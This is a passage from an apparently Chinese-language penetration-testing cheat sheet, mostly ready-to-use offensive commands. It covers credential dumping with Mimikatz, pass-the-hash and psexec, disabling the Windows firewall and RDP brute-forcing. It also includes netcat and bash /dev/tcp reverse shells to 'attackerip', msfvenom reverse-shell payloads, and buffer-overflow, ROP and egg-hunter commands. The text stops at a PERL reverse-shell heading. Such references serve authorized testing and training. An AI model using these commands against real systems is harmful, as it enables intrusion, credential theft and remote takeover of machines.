<h3><span id="meterpreter">Meterpreter 端口转发</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</span>
<span class="hljs-comment"># 转发远程端口到目标地址</span>
<span class="hljs-attribute">meterpreter</span> &gt; portfwd add –l <span class="hljs-number">3389</span> –p <span class="hljs-number">3389</span> –r <span class="hljs-number">172.16.194.141</span>
kali &gt; rdesktop <span class="hljs-number">127.0.0.1:3389</span>
</code></pre></div>
<h3><span id="-rdp">开启 RDP 服务</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">reg add <span class="hljs-string">"hklm\system\currentcontrolset\control\terminal server"</span> /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall <span class="hljs-built_in">set</span> service remoteadmin <span class="hljs-built_in">enable</span>
netsh firewall <span class="hljs-built_in">set</span> service remotedesktop <span class="hljs-built_in">enable</span>
</code></pre></div>
<h3><span id="-windows">关闭 Windows 防火墙</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span>
</code></pre></div>
<h3><span id="meterpreter-vncrdp">Meterpreter VNC\RDP</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</span></span>
run getgui -u admin -p <span class="hljs-number">1234</span>
run vnc -p <span class="hljs-number">5043</span>
</code></pre></div>
<h3><span id="-mimikatz">使用 Mimikatz</span></h3>
<p>获取 Windows 明文用户名密码</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/gentilkiwi/mimikatz.git</span>
privilege::debug
sekurlsa::logonPasswords full
</code></pre></div>
<h3><span id="i">获取哈希值</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">git clone https:<span class="hljs-comment">//github.com/byt3bl33d3r/pth-toolkit</span>
pth-winexe -U hash <span class="hljs-comment">//IP cmd</span>

<p>或者</p>
<p>apt-get install freerdp-x11<br>xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</p>
<p>在或者</p>
<p>meterpreter &gt; run post<span class="hljs-meta-keyword">/windows/</span>gather/hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:e52cac67419a9a224a3b108f3fa6cb6d:<span class="hljs-number">8846f</span>7<span class="hljs-symbol">eaee8fb117ad06bdd830b7586c::</span>:<br>msf &gt; use exploit<span class="hljs-meta-keyword">/windows/</span>smb/psexec<br>msf exploit(psexec) &gt; set payload windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp<br>msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:<span class="hljs-number">8846f</span>7eaee8fb117ad06bdd830b7586c<br>msf exploit(psexec) &gt; exploit<br>meterpreter &gt; shell<br></code></pre></div></p>
<h3><span id="-hashcat">使用 Hashcat 破解密码</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -m 400 <span class="hljs-_">-a</span> 0 <span class="hljs-built_in">hash</span> /root/rockyou.txt
</code></pre></div>
<h3><span id="-nc-banner">使用 NC 抓取 Banner 信息</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">nc <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span> <span class="hljs-number">80</span>
GET / HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span>
User-Agent: Mozilla/<span class="hljs-number">4.0</span>
<span class="hljs-symbol">Referrer:</span> www.example.com
<span class="hljs-params">&lt;enter&gt;</span>
<span class="hljs-params">&lt;enter&gt;</span>
</code></pre></div>
<h3><span id="-nc-windows-shell">使用 NC 在 Windows 上反弹 shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">c:&gt;nc -Lp 31337 -vv <span class="hljs-_">-e</span> cmd.exe
nc 192.168.0.10 31337
c:&gt;nc example.com 80 <span class="hljs-_">-e</span> cmd.exe
nc -lp 80

<p>nc -lp 31337 <span class="hljs-_">-e</span> /bin/bash<br>nc 192.168.0.10 31337<br>nc -vv -r(random) -w(<span class="hljs-built_in">wait</span>) 1 192.168.0.10 -z(i/o error) 1-1000<br></code></pre></div></p>
<h3><span id="-suidsgid-root">查找 SUID\SGID root 文件</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 查找 SUID root 文件</span>
find / -user root -perm <span class="hljs-number">-4000</span> -<span class="hljs-keyword">print</span>

<p><span class="hljs-comment"># 查找 SGID root 文件:</span><br>find / -group root -perm <span class="hljs-number">-2000</span> -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># 查找 SUID 和 SGID 文件:</span><br>find / -perm <span class="hljs-number">-4000</span> -o -perm <span class="hljs-number">-2000</span> -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># 查找不属于任何用户的文件:</span><br>find / -nouser -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># 查找不属于任何用户组的文件:</span><br>find / -nogroup -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># 查找软连接及其指向:</span><br>find / -type l -ls<br></code></pre></div></p>
<h3><span id="python-shell">Python shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre></div>
<h3><span id="pythonrubyphp-http">Python\Ruby\PHP HTTP 服务器</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs xml">python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888, <a href="https://image.3001.net/images/index/smilies/icon_biggrin.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/index/smilies/icon_biggrin.gif" src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" srcset="/img/loading.gif" alt=":D" class="wp-smiley"></a>
<noscript><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'https://image.3001.net/images/index/smilies/icon_biggrin.gif'</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">':D'</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'wp-smiley'</span> /&gt;</span></noscript> ocumentRoot =&gt; Dir.pwd).start"
php -S 0.0.0.0:8888
</code></pre></div>
<h3><span id="-pid">获取进程对应的 PID</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">fuser</span> -nv tcp <span class="hljs-number">80</span>
fuser -k -n tcp <span class="hljs-number">80</span>
</code></pre></div>
<h3><span id="-hydra-rdp">使用 Hydra 爆破 RDP</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">hydra <span class="hljs-_">-l</span> admin -P /root/Desktop/passwords -S X.X.X.X rdp
</code></pre></div>
<h3><span id="-windows-2">挂载远程 Windows 共享文件夹</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">smbmount /<span class="hljs-regexp">/X.X.X.X/c</span>$ /mnt/remote/ -o username=user,password=pass,rw
</code></pre></div>
<h3><span id="kali-exploit">Kali 下编译 Exploit</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-m32</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">output32</span> <span class="hljs-selector-tag">hello</span><span class="hljs-selector-class">.c</span> (32 位)
<span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-m64</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">output</span> <span class="hljs-selector-tag">hello</span><span class="hljs-selector-class">.c</span> (64 位)
</code></pre></div>
<h3><span id="kali-windows-exploit">Kali 下编译 Windows Exploit</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cs">wget -O mingw-<span class="hljs-keyword">get</span>-setup.exe http:<span class="hljs-comment">//sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span>
wine mingw-<span class="hljs-keyword">get</span>-setup.exe
<span class="hljs-keyword">select</span> mingw32-<span class="hljs-keyword">base</span>
cd /root/.wine/drive_c/windows
wget http:<span class="hljs-comment">//gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span>
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
</code></pre></div>
<h3><span id="nasm">NASM 命令</span></h3>
<p>注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。</p>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">nasm</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">bin</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.bin</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.asm</span>
<span class="hljs-selector-tag">nasm</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">elf</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.asm</span>; <span class="hljs-selector-tag">ld</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">payload</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.o</span>; <span class="hljs-selector-tag">objdump</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-tag">payload</span>
</code></pre></div>
<h3><span id="ssh">SSH 穿透</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">-D</span> 127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-pseudo">:1080</span> <span class="hljs-selector-tag">-p</span> 22 <span class="hljs-selector-tag">user</span>@<span class="hljs-keyword">IP</span>
Add socks4 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> in /etc/proxychains.conf
proxychains commands target
</code></pre></div>
<h3><span id="ssh-2">SSH 穿透从一个网络到另一个网络</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -D <span class="hljs-number">127.0.0.1:1080</span> -p <span class="hljs-number">22</span> user1<span class="hljs-variable">@IP1</span>
Add socks4 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span> in /etc/proxychains.conf
proxychains ssh -D <span class="hljs-number">127.0.0.1:1081</span> -p <span class="hljs-number">22</span> user1<span class="hljs-variable">@IP2</span>
Add socks4 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1081</span> in /etc/proxychains.conf
proxychains commands target
</code></pre></div>
<h3><span id="-metasploit">使用 metasploit 进行穿透</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">route</span> add X.X.X.X <span class="hljs-number">255.255.255.0</span> <span class="hljs-number">1</span>
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=<span class="hljs-number">443</span> RHOST=IP E

<p>或者</p>
<p><span class="hljs-comment"># <a href="https://www.offensive-security.com/metasploit-unleashed/pivoting/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></span><br>meterpreter &gt; ipconfig<br>IP Address  : <span class="hljs-number">10.1.13.3</span><br>meterpreter &gt; run autoroute -s <span class="hljs-number">10.1.13.0</span>/<span class="hljs-number">24</span><br>meterpreter &gt; run autoroute -p<br><span class="hljs-number">10.1.13.0</span>          <span class="hljs-number">255.255.255.0</span>      Session <span class="hljs-number">1</span><br>meterpreter &gt; Ctrl+Z<br>msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec<br>msf exploit(psexec) &gt; set RHOST <span class="hljs-number">10.1.13.2</span><br>msf exploit(psexec) &gt; exploit<br>meterpreter &gt; ipconfig<br>IP Address  : <span class="hljs-number">10.1.13.2</span><br></code></pre></div></p>
<h3><span id="-csv-exploit-db">基于 CSV 文件查询 Exploit-DB</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs perl">git clone https:<span class="hljs-regexp">//github</span>.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit –u
./searchsploit apache <span class="hljs-number">2.2</span>
./searchsploit <span class="hljs-string">"Linux Kernel"</span>

<p>cat files.csv | <span class="hljs-keyword">grep</span> -i linux | <span class="hljs-keyword">grep</span> -i kernel | <span class="hljs-keyword">grep</span> -i <span class="hljs-keyword">local</span> | <span class="hljs-keyword">grep</span> -v dos | uni<span class="hljs-string">q | grep 2.6 |</span> egrep <span class="hljs-string">“&lt;|&lt;=”</span> | <span class="hljs-keyword">sort</span> -k3<br></code></pre></div></p>
<h3><span id="msf-payloads">MSF Payloads</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> X &gt; system.exe
msfvenom -p php<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> R &gt; exploit.php
msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> -e x86/shikata_ga_nai -b <span class="hljs-string">"\x00"</span> -a x86 --platform win -f c
</code></pre></div>
<h3><span id="msf-linux-meterpreter-shell">MSF 生成在 Linux 下反弹的 Meterpreter Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 <span class="hljs-_">-e</span> <span class="hljs-_">-f</span> elf <span class="hljs-_">-a</span> x86 --platform linux -o shell
</code></pre></div>
<h3><span id="msf-shell-c-shellcode">MSF 生成反弹 Shell (C Shellcode)</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b <span class="hljs-string">"\x00\x0a\x0d"</span> <span class="hljs-_">-a</span> x86 --platform win <span class="hljs-_">-f</span> c
</code></pre></div>
<h3><span id="msf-python-shell">MSF 生成反弹 Python Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">msfvenom</span> -p cmd/unix/reverse_python LHOST=<span class="hljs-number">127.0.0.1</span> LPORT=<span class="hljs-number">443</span> -o shell.py
</code></pre></div>
<h3><span id="msf-asp-shell">MSF 生成反弹 ASP Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -f asp -a x86 --platform win -o shell.asp
</code></pre></div>
<h3><span id="msf-bash-shell">MSF 生成反弹 Bash Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p cmd<span class="hljs-meta-keyword">/unix/</span>reverse_bash LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -o shell.sh
</code></pre></div>
<h3><span id="msf-php-shell">MSF 生成反弹 PHP Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs xml">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">IP</span> <span class="hljs-attr">Address</span>&gt;</span> LPORT=<span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">Port</span> <span class="hljs-attr">to</span> <span class="hljs-attr">Connect</span> <span class="hljs-attr">On</span>&gt;</span> -o shell.php
add <span class="php"><span class="hljs-meta">&lt;?php</span> at the beginning
perl -i~ <span class="hljs-number">-0777</span>pe<span class="hljs-string">'s/^/&lt;?php \n/'</span> shell.php
</span></code></pre></div>
<h3><span id="msf-win-shell">MSF 生成反弹 Win Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -f exe -a x86 --platform win -o shell.exe
</code></pre></div>
<h3><span id="linux">Linux 常用安全命令</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 uid 查找对应的程序</span>
find / -uid 0 -perm -4000

<p><span class="hljs-comment"># 查找哪里拥有写权限</span><br>find / -perm -o=w</p>
<p><span class="hljs-comment"># 查找名称中包含点和空格的文件</span><br>find / -name <span class="hljs-string">“ “</span> -print<br>find / -name <span class="hljs-string">“..”</span> -print<br>find / -name <span class="hljs-string">“. “</span> -print<br>find / -name <span class="hljs-string">“ “</span> -print</p>
<p><span class="hljs-comment"># 查找不属于任何人的文件</span><br>find / -nouser</p>
<p><span class="hljs-comment"># 查找未链接的文件</span><br>lsof +L1</p>
<p><span class="hljs-comment"># 获取进程打开端口的信息</span><br>lsof -i</p>
<p><span class="hljs-comment"># 看看 ARP 表中是否有奇怪的东西</span><br>arp <span class="hljs-_">-a</span></p>
<p><span class="hljs-comment"># 查看所有账户</span><br>getent passwd</p>
<p><span class="hljs-comment"># 查看所有用户组</span><br>getent group</p>
<p><span class="hljs-comment"># 列举所有用户的 crontabs</span><br><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd|cut <span class="hljs-_">-f</span>1 <span class="hljs-_">-d</span>:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">“### Crontabs for <span class="hljs-variable">$user</span> ####”</span>; crontab -u <span class="hljs-variable">$user</span> <span class="hljs-_">-l</span>; <span class="hljs-keyword">done</span></p>
<p><span class="hljs-comment"># 生成随机密码</span><br>cat /dev/urandom| tr -dc ‘a-zA-Z0-9-<em>!@<span class="hljs-comment">#$%^&amp;*()</em>+{}|:&lt;&gt;?=’|fold -w 12| head -n 4</span></p>
<p><span class="hljs-comment"># 查找所有不可修改的文件</span><br>find . | xargs -I file lsattr <span class="hljs-_">-a</span> file 2&gt;/dev/null | grep ‘^….i’</p>
<p><span class="hljs-comment"># 使文件不可修改</span><br>chattr -i file<br></code></pre></div></p>
<h3><span id="windows">Windows 缓冲区溢出利用命令</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs sql">msfvenom -p windows/shell_bind_tcp -a x86 <span class="hljs-comment">--platform win -b "\x00" -f c</span>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 <span class="hljs-comment">--platform win -e x86/shikata_ga_nai -b "\x00" -f c</span>

<p>COMMONLY USED BAD CHARACTERS:<br>\x00\x0a\x0d\x20                              For http request<br>\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</p>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h1><p>pattern <span class="hljs-keyword">create</span><br>pattern <span class="hljs-keyword">offset</span> (EIP Address)<br>pattern <span class="hljs-keyword">offset</span> (ESP Address)<br><span class="hljs-keyword">add</span> garbage upto EIP <span class="hljs-keyword">value</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">add</span> (JMP ESP address) <span class="hljs-keyword">in</span> EIP . (ESP = shellcode )</p>
<p>!pvefindaddr pattern_create <span class="hljs-number">5000</span><br>!pvefindaddr suggest<br>!pvefindaddr modules<br>!pvefindaddr nosafeseh</p>
<p>!mona config -<span class="hljs-keyword">set</span> workingfolder <span class="hljs-keyword">C</span>:\Mona%<span class="hljs-keyword">p</span><br>!mona config -<span class="hljs-keyword">get</span> workingfolder<br>!mona <span class="hljs-keyword">mod</span><br>!mona bytearray -b <span class="hljs-string">“\x00\x0a”</span><br>!mona pc <span class="hljs-number">5000</span><br>!mona po EIP<br>!mona suggest<br></code></pre></div></p>
<h3><span id="seh-8211">SEH – 结构化异常处理</span></h3>
<p>注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。</p>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</span></span>
<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/243131.htm</span></span>
!mona suggest
!mona nosafeseh
nseh=<span class="hljs-string">"\xeb\x06\x90\x90"</span> (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
</code></pre></div>
<h3><span id="rop-dep">ROP (DEP)</span></h3>
<p>注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>
<p>DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。</p>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Return-oriented_programming</span></span>
<span class="hljs-meta"># https:<span class="hljs-comment">//zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</span></span>
<span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Data_Execution_Prevention</span></span>
<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/item/DEP/7694630</span></span>
!mona modules
!mona ropfunc -m *.dll -cpb <span class="hljs-string">"\x00\x09\x0a"</span>
!mona rop -m *.dll -cpb <span class="hljs-string">"\x00\x09\x0a"</span> (<span class="hljs-keyword">auto</span> suggest)
</code></pre></div>
<h3><span id="aslr-8211">ASLR – 地址空间格局随机化</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Address_space_layout_randomization</span></span>
<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/3862310.htm</span></span>
!mona noaslr
</code></pre></div>
<h3><span id="egg-hunter">寻蛋(EGG Hunter)技术</span></h3>
<p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自<a href="http://www.pediy.com/kssd/pediy11/120392.html" target="_blank" rel="noopener">看雪论坛</a>，更多详情可以查阅我在代码注释中增加的链接。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</span>
<span class="hljs-comment"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</span>
<span class="hljs-comment"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</span>
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward <span class="hljs-number">-60</span>)
buff=lxxllxxl+shell
!mona egg -t <span class="hljs-string">'w00t'</span>
</code></pre></div>
<h3><span id="gdb-debugger">GDB Debugger 常用命令</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 设置断点</span>
<span class="hljs-built_in">break</span> *_start

<p><span class="hljs-comment"># 执行下一个命令</span><br>next<br>step<br>n<br>s</p>
<p><span class="hljs-comment"># 继续执行</span><br><span class="hljs-built_in">continue</span><br>c</p>
<p><span class="hljs-comment"># 数据</span><br>checking <span class="hljs-string">‘REGISTERS’</span> and <span class="hljs-string">‘MEMORY’</span></p>
<p><span class="hljs-comment"># 显示寄存器的值: (Decimal,Binary,Hex)</span><br><span class="hljs-built_in">print</span> /d –&gt; Decimal<br><span class="hljs-built_in">print</span> /t –&gt; Binary<br><span class="hljs-built_in">print</span> /x –&gt; Hex<br>O/P :<br>(gdb) <span class="hljs-built_in">print</span> /d <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$17</span> = 13<br>(gdb) <span class="hljs-built_in">print</span> /t <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$18</span> = 1101<br>(gdb) <span class="hljs-built_in">print</span> /x <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$19</span> = 0xd<br>(gdb)</p>
<p><span class="hljs-comment"># 显示特定内存地址的值</span><br><span class="hljs-built_in">command</span> : x/nyz (Examine)<br>n –&gt; Number of fields to display ==&gt;<br>y –&gt; Format <span class="hljs-keyword">for</span> output ==&gt; c (character) , d (decimal) , x (Hexadecimal)<br>z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)<br></code></pre></div></p>
<h3><span id="bash-shell">BASH 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">bash -i &gt;&amp; <span class="hljs-meta-keyword">/dev/</span>tcp/X.X.X.X/<span class="hljs-number">443</span> <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span>

<p>exec <span class="hljs-meta-keyword">/bin/</span>bash <span class="hljs-number">0</span><span class="hljs-variable">&amp;0</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;0</span><br>exec <span class="hljs-meta-keyword">/bin/</span>bash <span class="hljs-number">0</span><span class="hljs-variable">&amp;0</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;0</span></p>
<p><span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span>;exec <span class="hljs-number">196</span>&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span>; sh <span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span> &gt;</span><span class="hljs-variable">&amp;196</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;196</span></p>
<p><span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span>;exec <span class="hljs-number">196</span>&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span>; sh <span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span> &gt;</span><span class="hljs-variable">&amp;196</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;196</span></p>
<p>exec <span class="hljs-number">5</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span> cat <span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done <span class="hljs-meta"># or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br>exec <span class="hljs-number">5</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span></p>
<p>cat <span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done <span class="hljs-meta"># or:</span><br>while read line <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span>; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done</p>
<p><span class="hljs-meta-keyword">/bin/</span>bash -i &gt; <span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">8080</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;1</span> <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;1</span><br><span class="hljs-meta-keyword">/bin/</span>bash -i &gt; <span class="hljs-meta-keyword">/dev/</span>tcp/X.X.X.X/<span class="hljs-number">443</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;1</span> <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;1</span><br></code></pre></div></p>
<h3><span id="perl-shell">PERL 反弹 Shell</span></h3>
